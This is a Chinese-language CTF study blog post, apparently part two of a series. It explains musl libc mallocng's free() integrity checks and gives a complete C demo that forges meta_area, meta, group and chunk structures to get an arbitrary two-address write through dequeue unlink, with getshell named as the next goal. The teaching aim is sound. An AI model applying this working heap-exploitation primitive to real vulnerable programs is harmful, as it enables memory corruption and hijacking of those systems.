---
title: musl pwn 入门 (2)
date: 2023-02-28 22:40:46
categories:
- 学习笔记
- musl pwn 系列
---
在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。

musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的`group`和`meta`，因此除了构造假chunk外，还需要构造假`group`和假`meta`。如果在假`meta`中合理构造`prev`和`next`指针，在`nontrivial_free`中调用`dequeue`函数就可以实现这两个地址互相写。

但在整个流程中，我们需要绕过很多检查，以及进入正确的分支。

在`free`中会调用`nontrivial_free`，`free`中调用的`get_meta`函数中有一些检查项：

```c
(/src/malloc/mallocng/meta.h, line 129)
static inline struct meta *get_meta(const unsigned char *p)
{
	assert(!((uintptr_t)p & 15));
	int offset = *(const uint16_t *)(p - 2);
	int index = get_slot_index(p);
	if (p[-4]) {
		assert(!offset);
		offset = *(uint32_t *)(p - 8);
		assert(offset > 0xffff);
	}
	const struct group *base = (const void *)(p - UNIT*offset - UNIT);
	const struct meta *meta = base->meta;
	assert(meta->mem == base);
	assert(index <= meta->last_idx);
	assert(!(meta->avail_mask & (1u<<index)));
	assert(!(meta->freed_mask & (1u<<index)));
	const struct meta_area *area = (void *)((uintptr_t)meta & -4096);
	assert(area->check == ctx.secret);
	if (meta->sizeclass < 48) {
		assert(offset >= size_classes[meta->sizeclass]*index);
		assert(offset < size_classes[meta->sizeclass]*(index+1));
	} else {
		assert(meta->sizeclass == 63);
	}
	if (meta->maplen) {
		assert(offset <= meta->maplen*4096UL/UNIT - 1);
	}
	return (struct meta *)meta;
}

```

1. meta->mem == base，即meta中保存的group指针要正确。
2. index <= meta->last_idx，即chunk的索引不能越界。
3. area->check == ctx.secret，即meta所在的meta_area的校验值正确。
4. offset >= size_classes[meta->sizeclass]*index
5. offset < size_classes[meta->sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。
6. assert(offset <= meta->maplen*4096UL/UNIT - 1);，即检查offset是否越界。

如果伪造的`meta`位于一个伪造的`meta_area`中，需要首先获取校验值`secret`并保存到`meta_area`开头，即这一页最开始的地方。

通过这个函数的检查之后，`nontrivial_free`的分支语句：
```c
static struct mapinfo nontrivial_free(struct meta *g, int i)
{
	uint32_t self = 1u<<i;
	int sc = g->sizeclass;
	uint32_t mask = g->freed_mask | g->avail_mask;

	if (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)) {
		// any multi-slot group is necessarily on an active list
		// here, but single-slot groups might or might not be.
		if (g->next) {
			assert(sc < 48);
			int activate_new = (ctx.active[sc]==g);
			dequeue(&ctx.active[sc], g);
			if (activate_new && ctx.active[sc])
				activate_group(ctx.active[sc]);
		}
		return free_group(g);
	} else if (!mask) {
		assert(sc < 48);
		// might still be active if there were no allocations
		// after last available slot was taken.
		if (ctx.active[sc] != g) {
			queue(&ctx.active[sc], g);
		}
	}
	a_or(&g->freed_mask, self);
	return (struct mapinfo){ 0 };
}
```

这里要求`mask+self == (2u<<g->last_idx)-1 && okay_to_free(g)`，因此要合理设置`meta`的两个`mask`的值。

之后调用了`free_group`：

```c
static struct mapinfo free_group(struct meta *g)
{
	struct mapinfo mi = { 0 };
	int sc = g->sizeclass;
	if (sc < 48) {
		ctx.usage_by_class[sc] -= g->last_idx+1;
	}
	if (g->maplen) {
		step_seq();
		record_seq(sc);
		mi.base = g->mem;
		mi.len = g->maplen*4096UL;
	} else {
		void *p = g->mem;
		struct meta *m = get_meta(p);
		int idx = get_slot_index(p);
		g->mem->meta = 0;
		// not checking size/reserved here; it's intentionally invalid
		mi = nontrivial_free(m, idx);
	}
	free_meta(g);
	return mi;
}
```

这里我们不能在if-else语句中跳转到else分支，那样会再一次调用`nontrivial_free`，因此要保证`meta`的`maplen`字段不为0。

这些检查与条件判断通过后，就可以成功释放假chunk了。

下面就是musl libc unlink漏洞的demo程序，如有任何非预期情况请与笔者联系，不胜感激。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>

struct meta {
    struct meta *prev, *next;
    struct group *mem;
    volatile int avail_mask, freed_mask;
    unsigned long long last_idx:5;
    unsigned long long freeable:1;
    unsigned long long sizeclass:6;
    unsigned long long maplen:8*8-12;
};

struct group {
    struct meta *meta;
    unsigned char active_idx:5;
    char pad[0x10 - sizeof(struct meta *) - 1];
    unsigned char storage[];
};

struct meta_area {
    unsigned long long check;
    struct meta_area *next;
    int nslots;
    struct meta slots[];
};

unsigned long long victim_1[0x8];
unsigned long long victim_2[0x8];

#define BLACK       "30"
#define RED         "31"
#define GREEN       "32"
#define YELLOW      "33"
#define BLUE        "34"
#define PURPLE      "35"
#define GREEN_DARK  "36"
#define WHITE       "37"

#define UNDEFINED   "-"
#define HIGHLIGHT   "1"
#define UNDERLINE   "4"
#define SPARK       "5"

#define STR_END      "\033[0m"

void printf_color(char* color, char* effect, char* string){
    char buffer[0x1000] = {0};
    strcpy(buffer, "\033[");
    if(effect[0] != '-'){
        strcat(buffer, effect);
        strcat(buffer, ";");
    }
    strcat(buffer, color);
    strcat(buffer, "m");
    strcat(buffer, string);
    printf("%s" STR_END, buffer);
}

void print_binary(char* buf, int length){
    printf("---------------------------------------------------------------------------\n");
    printf("Address info starting in %p:\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    printf("---------------------------------------------------------------------------\n");
}

struct group* get_group(const unsigned char* chunk){
    int offset = *(const unsigned short *)(chunk - 2);
    if (chunk[-4])
        offset = *(unsigned int *)(chunk - 8);
    struct group* group_addr = (void *)(chunk - 0x10*offset - 0x10);
    return group_addr;
}

struct meta* get_meta(const unsigned char* chunk){
    struct group* group_addr = get_group(chunk);
    struct meta* meta_addr = group_addr->meta;
    return meta_addr;
}

struct meta_area* get_meta_area(const void* meta){
    return (struct meta_area*)((unsigned long long)meta & -4096);
}

int main(){
    printf_color(GREEN, UNDEFINED, "本程序用于演示musl libc中的unlink操作。\n");
    printf_color(GREEN, UNDEFINED, "测试环境：ubuntu 22.04，musl libc版本：1.2.2。\n");
    printf_color(GREEN, UNDEFINED, "鉴于musl libc的轻量性，与其相关的利用方式也较为单一。\n");
    printf_color(GREEN, UNDEFINED, "本程序所演示的unlink是最为常用的一种利用方式之一。\n");

    printf_color(GREEN, UNDEFINED, "musl libc与glibc不同，在主程序的main函数开始执行时，内存分配器就已经完成了初始化。\n");
    printf_color(GREEN, UNDEFINED, "请注意：在一个group中分配出来的chunk很可能在地址空间上不相邻。\n");
    printf_color(GREEN, UNDEFINED, "因为一个group需要确保每个chunk都能够容纳该范围内最大的chunk。\n");
    printf_color(GREEN, UNDEFINED, "因此，调试便是musl libc赛题的重中之重。\n");
    printf_color(GREEN, UNDEFINED, "下面是刚刚进入main函数时堆的情况：\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "pwndbg> mheap\n"
                 "          secret : 0xd8e803bc461ae35a\n"
                 "    mmap_counter : 0x0\n"
                 "      avail_meta : 0x55555555a0e0 (count: 96)\n"
                 "       free_meta : 0\n"
                 " avail_meta_area : 0x55555555b000 (count: 0)\n"
                 "  meta_area_head : 0x55555555a000\n"
                 "  meta_area_tail : 0x55555555a000\n"
                 "       active[7] : 0x55555555a090 (mem: 0x555555558f40) -> 0x55555555a0b8 (mem: 0x7ffff7ffef40) [0x80]\n"
                 "      active[15] : 0x55555555a068 (mem: 0x555555558d40) [0x1f0]\n"
                 "      active[19] : 0x55555555a040 (mem: 0x555555558940) [0x3f0]\n"
                 "      active[23] : 0x55555555a018 (mem: 0x555555558140) [0x7f0]\n\n");

    printf_color(GREEN, UNDEFINED, "可见已经有一些meta被链入到链表数组之中了。\n");
    printf_color(GREEN, UNDEFINED, "但这对做题的影响并不大，通过多次调试，我们就能够让自己的chunk进入想要的meta。\n");
    printf_color(GREEN, UNDEFINED, "接下来让我们尝试分配几个chunk。\n");

    void* chunks[14];

    for(int i=0; i<14; i++) {
        chunks[i] = malloc(0x140);
        printf_color(GREEN, UNDEFINED, "第");
        printf("\033[" GREEN "m%d\033[0m", i+1);
        printf_color(GREEN, UNDEFINED, "次malloc返回的地址为：");
        printf("\033[1;31m%p\n\033[0m", chunks[i]);
    }

    printf_color(GREEN, UNDEFINED, "\n接下来让我们用源码中给出的寻找chunk所在meta的方法回溯这些chunk所在的group和meta。\n");
    struct group* groups[14];
    struct meta* metas[14];
    for(int i=0; i<14; i++){
        groups[i] = get_group(chunks[i]);
        metas[i] = get_meta(chunks[i]);
    }

    for(int i=0; i<14; i++){
        printf_color(GREEN, UNDEFINED, "第");
        printf("\033[" GREEN "m%d\033[0m", i+1);
        printf_color(GREEN, UNDEFINED, "次malloc获得chunk的group地址和meta地址分别为：");
        printf("\033[1;31m%p %p\n\033[0m", groups[i], metas[i]);
    }

    printf_color(GREEN, UNDEFINED, "通过nontrivial_free中的dequeue函数进行unlink，首先要通过get_meta函数的重重检查：\n\n");
    printf_color(YELLOW, HIGHLIGHT, "(/src/malloc/mallocng/meta.h, line 129)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "static inline struct meta *get_meta(const unsigned char *p)\n"
                 "{\n"
                 "\tassert(!((uintptr_t)p & 15));\n"
                 "\tint offset = *(const uint16_t *)(p - 2);\n"
                 "\tint index = get_slot_index(p);\n"
                 "\tif (p[-4]) {\n"
                 "\t\tassert(!offset);\n"
                 "\t\toffset = *(uint32_t *)(p - 8);\n"
                 "\t\tassert(offset > 0xffff);\n"
                 "\t}\n"
                 "\tconst struct group *base = (const void *)(p - UNIT*offset - UNIT);\n"
                 "\tconst struct meta *meta = base->meta;\n"
                 "\tassert(meta->mem == base);\n"
                 "\tassert(index <= meta->last_idx);\n"
                 "\tassert(!(meta->avail_mask & (1u<<index)));\n"
                 "\tassert(!(meta->freed_mask & (1u<<index)));\n"
                 "\tconst struct meta_area *area = (void *)((uintptr_t)meta & -4096);\n"
                 "\tassert(area->check == ctx.secret);\n"
                 "\tif (meta->sizeclass < 48) {\n"
                 "\t\tassert(offset >= size_classes[meta->sizeclass]*index);\n"
                 "\t\tassert(offset < size_classes[meta->sizeclass]*(index+1));\n"
                 "\t} else {\n"
                 "\t\tassert(meta->sizeclass == 63);\n"
                 "\t}\n"
                 "\tif (meta->maplen) {\n"
                 "\t\tassert(offset <= meta->maplen*4096UL/UNIT - 1);\n"
                 "\t}\n"
                 "\treturn (struct meta *)meta;\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "下面我们逐一查看一下这些检查的具体内容。\n");
    printf_color(YELLOW, HIGHLIGHT, "1. meta->mem == base，即meta中保存的group指针要正确。\n");
    printf_color(YELLOW, HIGHLIGHT, "2. index <= meta->last_idx，即chunk的索引不能越界。\n");
    printf_color(RED   , HIGHLIGHT, "3. area->check == ctx.secret，即meta所在的meta_area的校验值正确。\n");
    printf_color(YELLOW, HIGHLIGHT, "4. offset >= size_classes[meta->sizeclass]*index\n");
    printf_color(YELLOW, HIGHLIGHT, "5. offset < size_classes[meta->sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。\n");
    printf_color(YELLOW, HIGHLIGHT, "6. assert(offset <= meta->maplen*4096UL/UNIT - 1);，即检查offset是否越界。\n");

    printf_color(GREEN, UNDEFINED, "这些检查之中对我们最为重要的就是校验值的检查。\n");
    printf_color(GREEN, UNDEFINED, "只有泄露出secret值，我们才能释放伪造meta_area中伪造meta的group的chunk。\n");

    struct meta_area* area = get_meta_area(metas[0]);
    printf_color(GREEN, UNDEFINED, "上面分配的所有meta均在同一个meta_area中，地址为：");
    printf("\033[1;" YELLOW "m%p\n\033[0m", area);

    printf_color(GREEN, UNDEFINED, "可以由此获取到secret的值为：");
    printf("\033[1;" YELLOW "m%#llx\n\n\033[0m", area->check);

    unsigned long long secret = area->check;

    printf_color(GREEN, UNDEFINED, "接下来我们来伪造chunk以及其上的结构。\n");

    void* mmap_space = mmap((void*)0xdeadbeef000, 0x2000, PROT_WRITE | PROT_READ, MAP_PRIVATE | MAP_ANON, -1, 0);
    struct meta_area* fake_meta_area = mmap_space;
    fake_meta_area->check = secret;

    struct meta* fake_meta = (struct meta*)((unsigned long long) mmap_space + 0x100);
    fake_meta->maplen = 1;
    fake_meta->sizeclass = 7;       // group中保存的chunk大小，这里设置为0x80
    fake_meta->last_idx = 4;        // group中chunk的总数，这里设置为4表示chunk总数为5
    fake_meta->freeable = 1;        // 通过okay_to_free检查

    struct group* fake_group = (struct group*)((unsigned long long) mmap_space + 0x1000);
    fake_meta->mem = fake_group;    // 通过检查1
    fake_group->meta = fake_meta;   // 使group能够找到meta
    fake_meta->avail_mask = 0b11101;// 使nontrivial_free进入if循环，得以执行dequeue

    char* fake_chunk = (char*)((unsigned long long) mmap_space + 0x1000 + 0x10 + 0x80);
    *(unsigned short *)(fake_chunk - 2) = 8;    // offset
    *(unsigned char*)(fake_chunk - 3) = 1;      // index

    printf_color(GREEN, UNDEFINED, "绕过第1个检查，只需要设置meta中的group指针为假group指针即可。\n");
    printf_color(GREEN, UNDEFINED, "第2个检查需要正确设置chunk的index值，本程序释放的是group中第2个chunk，因此索引为1。\n");
    printf_color(GREEN, UNDEFINED, "注意索引值存放的位置，是chunk地址-3这个字节。\n");
    printf_color(GREEN, UNDEFINED, "第3个检查需要我们提前泄露secret的值，并填写到meta_area中。\n");
    printf_color(GREEN, UNDEFINED, "检查4和5只需要正确计算chunk的大小，填写chunk的索引值即可。\n");
    printf_color(GREEN, UNDEFINED, "本程序尝试释放sizeclass=7的chunk，即chunk大小为0x80，因此第2个chunk的索引为0x80>>4=8。\n");
    printf_color(GREEN, UNDEFINED, "索引值index保存在chunk的前面两个字节中，正确填入即可。\n");
    printf_color(GREEN, UNDEFINED, "正确设置index后，检查6一般也是没有问题的。\n\n");

    printf_color(GREEN, UNDEFINED, "在通过get_meta的检查后，还需要通过nontrivial_free中的if语句条件判断。\n\n");
    printf_color(YELLOW, HIGHLIGHT, "(/src/malloc/mallocng/free.c, line 72)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "static struct mapinfo nontrivial_free(struct meta *g, int i)\n"
                 "{\n"
                 "\tuint32_t self = 1u<<i;\n"
                 "\tint sc = g->sizeclass;\n"
                 "\tuint32_t mask = g->freed_mask | g->avail_mask;\n"
                 "\n"
                 "\t\033[1;31mif (mask+self == (2u<<g->last_idx)-1 && okay_to_free(g))\033[1;" PURPLE "m {\n"
                 "\t\t// any multi-slot group is necessarily on an active list\n"
                 "\t\t// here, but single-slot groups might or might not be.\n"
                 "\t\tif (g->next) {\n"
                 "\t\t\tassert(sc < 48);\n"
                 "\t\t\tint activate_new = (ctx.active[sc]==g);\n"
                 "\t\t\tdequeue(&ctx.active[sc], g);\n"
                 "\t\t\tif (activate_new && ctx.active[sc])\n"
                 "\t\t\t\tactivate_group(ctx.active[sc]);\n"
                 "\t\t}\n"
                 "\t\treturn free_group(g);\n"
                 "\t} else if (!mask) {\n"
                 "\t\tassert(sc < 48);\n"
                 "\t\t// might still be active if there were no allocations\n"
                 "\t\t// after last available slot was taken.\n"
                 "\t\tif (ctx.active[sc] != g) {\n"
                 "\t\t\tqueue(&ctx.active[sc], g);\n"
                 "\t\t}\n"
                 "\t}\n"
                 "\ta_or(&g->freed_mask, self);\n"
                 "\treturn (struct mapinfo){ 0 };\n"
                 "}\n\n");

    printf_color(GREEN, UNDEFINED, "只需要修改meta中的freeable字段为1即可通过该检查。\n");

    printf_color(GREEN, UNDEFINED, "最后还需要在free_group中进入正确的else分支：\n\n");
    printf_color(RED, HIGHLIGHT, "(/src/malloc/mallocng/free.c, line 14)\n");
    printf_color(PURPLE, HIGHLIGHT,
                 "static struct mapinfo free_group(struct meta *g)\n"
                 "{\n"
                 "\tstruct mapinfo mi = { 0 };\n"
                 "\tint sc = g->sizeclass;\n"
                 "\tif (sc < 48) {\n"
                 "\t\tctx.usage_by_class[sc] -= g->last_idx+1;\n"
                 "\t}\n"
                 "\tif (g->maplen) {\n"
                 "\t\tstep_seq();\n"
                 "\t\trecord_seq(sc);\n"
                 "\t\tmi.base = g->mem;\n"
                 "\t\tmi.len = g->maplen*4096UL;\n"
                 "\t} else {\n"
                 "\t\tvoid *p = g->mem;\n"
                 "\t\tstruct meta *m = get_meta(p);\n"
                 "\t\tint idx = get_slot_index(p);\n"
                 "\t\tg->mem->meta = 0;\n"
                 "\t\t// not checking size/reserved here; it's intentionally invalid\n"
                 "\t\tmi = nontrivial_free(m, idx);\n"
                 "\t}\n"
                 "\tfree_meta(g);\n"
                 "\treturn mi;\n"
                 "}\n\n");
    printf_color(GREEN, UNDEFINED, "这需要我们设置meta->maplen为非零值，防止再次进入nontrivial_free。\n");
    printf_color(GREEN, UNDEFINED, "这里的maplen就设置为group占用的页数量即可。\n");

    printf_color(GREEN, UNDEFINED, "接下来我们向meta的两个链表指针写入事先准备好的地址。\n");
    printf_color(GREEN, UNDEFINED, "meta->prev写入：");
    printf("\033[1;" YELLOW "m%p\033[0m\n", victim_1);
    printf_color(GREEN, UNDEFINED, "meta->next写入：");
    printf("\033[1;" YELLOW "m%p\033[0m\n", victim_2);

    fake_meta->prev = (struct meta*)victim_1;
    fake_meta->next = (struct meta*)victim_2;

    printf_color(GREEN, UNDEFINED, "下面调用free函数释放这个假chunk。\n\n");

    free(fake_chunk);

    printf_color(GREEN, UNDEFINED, "释放后，目标地址附近的值已经被成功修改：\n");
    print_binary((char*)victim_1, 0x80);

    return 0;
}
```

这证明使用一个假chunk修改两个地址的值是可行的，在free之后，chunk所在的页被释放了，这样就不会对接下来的进一步利用造成其他任何影响了。

为了利用unlink，我们需要构造很多东西，不能落下其中任何一个，在解题与学习时要特别注意。在下一篇文章中笔者将会分析unlink如何与FILE结构体配合，从而最终getshell。
